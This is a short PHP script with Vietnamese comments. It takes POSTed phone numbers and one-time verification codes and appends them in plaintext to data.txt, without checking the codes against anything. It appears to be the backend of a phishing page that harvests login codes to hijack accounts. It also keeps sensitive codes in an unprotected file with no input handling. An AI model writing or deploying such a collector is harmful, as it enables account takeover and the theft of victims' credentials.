<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $phone = isset($_POST['phone']) ? $_POST['phone'] : '';
    $code = isset($_POST['code']) ? $_POST['code'] : null;
    $file = 'data.txt';

    // Nếu chỉ có số điện thoại, lưu số điện thoại
    if ($phone && !$code) {
        file_put_contents($file, "Phone: $phone\n", FILE_APPEND);
        echo "Phone number saved successfully!";
    }
    // Nếu có mã xác thực, lưu cả mã
    else if ($phone && $code) {
        file_put_contents($file, "Phone: $phone, Code: $code\n", FILE_APPEND);
        echo "Phone number and code saved successfully!";
    }
}
?>
